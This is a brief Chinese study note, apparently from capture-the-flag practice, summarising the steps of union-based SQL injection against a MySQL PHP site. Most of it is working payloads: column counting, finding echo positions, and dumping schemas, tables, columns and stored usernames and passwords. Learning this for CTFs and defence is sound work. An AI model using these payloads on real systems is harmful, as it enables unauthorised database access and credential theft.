总结

sql注入典型步骤
1.寻找注入点。可以先试着用万能密码登录admin账号，再以admin账号的用户名和密码作为注入点。注入点一般形如/xyz.php?payload=1
2.查询字段个数。用'order by x#来查询，改变x的值，根据页面的变化来判断字段个数。
3.查询回显位，用形如payload=1' union select 1,2,3#的方式来检测回显位。将要查询的数据放在回显位上。
4.注出数据库类型，用payload=1' union select 1,database(),version()#查询。
5.爆库。payload=-1 union select 1,group_concat(schema_name) from information_schema.schemata
6.爆表。payload如下：payload=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#解释一下其中的含义：前半句group_concat(table_name) from information_schema.tables的意思是，mysql有一个数据库存储着其他数据库的信息，这个数据库就是information_schema，它的tables字段存储着所有的表名。后半段的意思是条件为当前数据库，所以这句话的意思是查找当前数据库中所有的表名。
7.爆列名。payload如下：payload=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'#
8.爆字段。payload=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1#
